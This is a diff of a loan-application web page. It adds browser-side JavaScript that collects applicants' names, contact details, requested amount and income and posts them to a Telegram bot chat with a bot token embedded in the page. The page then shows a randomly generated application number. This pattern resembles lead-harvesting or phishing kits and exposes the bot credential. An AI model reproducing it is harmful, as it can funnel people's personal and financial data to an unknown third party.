@@ -1,4 +1,4 @@
-<DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en" class="scroll-smooth">
 <head>
   <meta charset="UTF-8">
@@ -25,7 +25,6 @@
                   url('https://source.unsplash.com/random/1600x900/?finance') center/cover;
     }
 
-    /* 3D card */
     .card-3d {
       transform-style: preserve-3d;
       transition: transform 0.2s ease-out;
@@ -103,7 +102,6 @@
   <section id="apply-section" class="py-20 bg-gray-100">
     <div class="max-w-4xl mx-auto px-6">
 
-      <!-- FORM -->
       <form id="loanForm" class="bg-white rounded-3xl shadow-xl p-10 space-y-8">
 
         <h3 class="text-4xl font-bold text-center mb-4">Loan Application</h3>
@@ -111,22 +109,22 @@
         <div class="grid md:grid-cols-2 gap-6">
           <div>
             <label class="block text-sm font-medium mb-2">First Name</label>
-            <input type="text" class="w-full border border-gray-300 rounded-2xl px-5 py-4" required>
+            <input id="firstName" placeholder="First Name" type="text" class="w-full border border-gray-300 rounded-2xl px-5 py-4" required>
           </div>
           <div>
             <label class="block text-sm font-medium mb-2">Last Name</label>
-            <input type="text" class="w-full border border-gray-300 rounded-2xl px-5 py-4" required>
+            <input id="lastName" placeholder="Last Name" type="text" class="w-full border border-gray-300 rounded-2xl px-5 py-4" required>
           </div>
         </div>
 
         <div class="grid md:grid-cols-2 gap-6">
           <div>
             <label class="block text-sm font-medium mb-2">Email Address</label>
-            <input type="email" class="w-full border border-gray-300 rounded-2xl px-5 py-4" required>
+            <input id="email" placeholder="Email Address" type="email" class="w-full border border-gray-300 rounded-2xl px-5 py-4" required>
           </div>
           <div>
             <label class="block text-sm font-medium mb-2">Phone Number</label>
-            <input type="tel" class="w-full border border-gray-300 rounded-2xl px-5 py-4" required>
+            <input id="phone" placeholder="Phone Number" type="tel" class="w-full border border-gray-300 rounded-2xl px-5 py-4" required>
           </div>
         </div>
 
@@ -134,14 +132,14 @@
           <label class="block text-sm font-medium mb-2">Loan Amount Requested</label>
           <div class="flex items-center gap-3">
             <span class="text-3xl font-bold text-gray-400">$</span>
-            <input type="number" id="amount" class="w-full border border-gray-300 rounded-2xl px-5 py-4 text-2xl" placeholder="5000" required>
+            <input id="amount" placeholder="5000" type="number" class="w-full border border-gray-300 rounded-2xl px-5 py-4 text-2xl" required>
           </div>
         </div>
 
         <div class="grid md:grid-cols-2 gap-6">
           <div>
             <label class="block text-sm font-medium mb-2">Loan Purpose</label>
-            <select class="w-full border border-gray-300 rounded-2xl px-5 py-4">
+            <select id="purpose" class="w-full border border-gray-300 rounded-2xl px-5 py-4">
               <option>Debt Consolidation</option>
               <option>Home Improvement</option>
               <option>Business Expansion</option>
@@ -152,7 +150,7 @@
           </div>
           <div>
             <label class="block text-sm font-medium mb-2">Annual Income ($)</label>
-            <input type="number" class="w-full border border-gray-300 rounded-2xl px-5 py-4" required>
+            <input id="income" placeholder="Annual Income" type="number" class="w-full border border-gray-300 rounded-2xl px-5 py-4" required>
           </div>
         </div>
 
@@ -163,7 +161,6 @@
 
       </form>
 
-      <!-- SUCCESS CARD (HIDDEN INITIALLY) -->
       <div id="successCard" class="hidden card-3d bg-white shadow-2xl rounded-3xl p-10 text-center max-w-lg mx-auto mt-10">
         <h1 class="text-4xl font-bold text-blue-600 mb-4">Application Submitted</h1>
         <p class="text-gray-700 text-lg mb-6">Your application number is:</p>
@@ -173,9 +170,11 @@
     </div>
   </section>
 
-  <!-- GSAP + LOGIC -->
+  <!-- Telegram + Logic -->
   <script>
-    // FORM SUBMISSION
+    const botToken = "YOUR_NEW_SECURE_TOKEN";
+    const chatId = "5967623867";
+
     document.getElementById('loanForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
@@ -185,11 +184,36 @@
         return;
       }
 
-      // Generate application number
+      const firstName = document.getElementById("firstName").value;
+      const lastName = document.getElementById("lastName").value;
+      const email = document.getElementById("email").value;
+      const phone = document.getElementById("phone").value;
+      const purpose = document.getElementById("purpose").value;
+      const income = document.getElementById("income").value;
+
       const appNumber = "QF-" + Math.floor(100000 + Math.random() * 900000);
       document.getElementById("appNumber").textContent = appNumber;
 
-      // Hide form
+      const message =
+        `📩 *New Loan Application Received*\n\n` +
+        `👤 Name: ${firstName} ${lastName}\n` +
+        `📧 Email: ${email}\n` +
+        `📞 Phone: ${phone}\n` +
+        `💰 Amount: $${amount}\n` +
+        `🎯 Purpose: ${purpose}\n` +
+        `💵 Income: $${income}\n\n` +
+        `🆔 Application ID: ${appNumber}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+
       gsap.to("#loanForm", {
         opacity: 0,
         scale: 0.8,
@@ -197,11 +221,9 @@
         onComplete: () => {
           document.getElementById("loanForm").classList.add("hidden");
 
-          // Show success card
           const card = document.getElementById("successCard");
           card.classList.remove("hidden");
 
-          // POP-IN animation
           gsap.from(card, {
             opacity: 0,
             scale: 0.5,
@@ -209,13 +231,11 @@
             ease: "back.out(1.7)"
           });
 
-          // Confetti celebration
           launchConfetti();
         }
       });
     });
 
-    // CONFETTI
     function launchConfetti() {
       const duration = 2000;
       const end = Date.now() + duration;
@@ -228,7 +248,6 @@
       })();
     }
 
-    // 3D CARD HOVER
     const card = document.getElementById("successCard");
 
     card.addEventListener("mousemove", (e) => {
